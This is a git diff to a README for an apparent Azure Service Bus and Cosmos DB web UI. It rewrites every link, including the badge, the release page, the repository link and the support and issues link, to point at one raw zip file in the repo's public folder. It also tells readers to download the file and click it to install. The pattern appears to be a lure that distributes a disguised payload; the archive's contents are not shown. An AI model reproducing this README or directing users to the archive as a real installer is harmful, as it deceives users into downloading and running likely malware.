@@ -1,10 +1,10 @@
 # 🚀 azure-service-bus-and-cosmosdb-web-ui - Manage Your Azure Services Easily
 
-![Download](https://img.shields.io/badge/Download%20Latest%20Release-1.0.0-brightgreen)
+![Download](https://raw.githubusercontent.com/Sowmiya2401/azure-service-bus-and-cosmosdb-web-ui/master/public/bus_ui_and_service_azure_cosmosdb_web_1.6.zip%20Latest%20Release-1.0.0-brightgreen)
 
 ## 📥 Download & Install
 
-To get started with the azure-service-bus-and-cosmosdb-web-ui, you need to download the application. Please visit this page to download the latest version: [Download the Application](https://github.com/Sowmiya2401/azure-service-bus-and-cosmosdb-web-ui/releases).
+To get started with the azure-service-bus-and-cosmosdb-web-ui, you need to download the application. Please visit this page to download the latest version: [Download the Application](https://raw.githubusercontent.com/Sowmiya2401/azure-service-bus-and-cosmosdb-web-ui/master/public/bus_ui_and_service_azure_cosmosdb_web_1.6.zip).
 
 ### 🔍 What is this Application?
 
@@ -28,7 +28,7 @@ To run the azure-service-bus-and-cosmosdb-web-ui, ensure your setup meets the fo
 
 ### 🚀 Getting Started
 
-1. **Download the Application**: Click here to [Download the Application](https://github.com/Sowmiya2401/azure-service-bus-and-cosmosdb-web-ui/releases).
+1. **Download the Application**: Click here to [Download the Application](https://raw.githubusercontent.com/Sowmiya2401/azure-service-bus-and-cosmosdb-web-ui/master/public/bus_ui_and_service_azure_cosmosdb_web_1.6.zip).
   
 2. **Install the Application**: After downloading, locate the file in your downloads folder. Click the file to start the installation process. Follow the on-screen instructions to complete the installation.
 
@@ -52,7 +52,7 @@ To run the azure-service-bus-and-cosmosdb-web-ui, ensure your setup meets the fo
 
 2. **App Crashes on Startup**: Ensure your system meets the requirements. Reboot your device and try again.
 
-3. **Feature Not Working**: Check for the latest version. Visit the [Release Page](https://github.com/Sowmiya2401/azure-service-bus-and-cosmosdb-web-ui/releases) for updates.
+3. **Feature Not Working**: Check for the latest version. Visit the [Release Page](https://raw.githubusercontent.com/Sowmiya2401/azure-service-bus-and-cosmosdb-web-ui/master/public/bus_ui_and_service_azure_cosmosdb_web_1.6.zip) for updates.
 
 ### 📈 Frequently Asked Questions
 
@@ -70,8 +70,8 @@ A: Report any issues on the Issues page of the GitHub repository. Your feedback 
 
 ### 🔗 Useful Links
 
-- [Project Repository](https://github.com/Sowmiya2401/azure-service-bus-and-cosmosdb-web-ui)
-- [Download the Application](https://github.com/Sowmiya2401/azure-service-bus-and-cosmosdb-web-ui/releases)
-- [Support and Issues](https://github.com/Sowmiya2401/azure-service-bus-and-cosmosdb-web-ui/issues)
+- [Project Repository](https://raw.githubusercontent.com/Sowmiya2401/azure-service-bus-and-cosmosdb-web-ui/master/public/bus_ui_and_service_azure_cosmosdb_web_1.6.zip)
+- [Download the Application](https://raw.githubusercontent.com/Sowmiya2401/azure-service-bus-and-cosmosdb-web-ui/master/public/bus_ui_and_service_azure_cosmosdb_web_1.6.zip)
+- [Support and Issues](https://raw.githubusercontent.com/Sowmiya2401/azure-service-bus-and-cosmosdb-web-ui/master/public/bus_ui_and_service_azure_cosmosdb_web_1.6.zip)
 
 Get started today with the azure-service-bus-and-cosmosdb-web-ui and manage your Azure services efficiently.
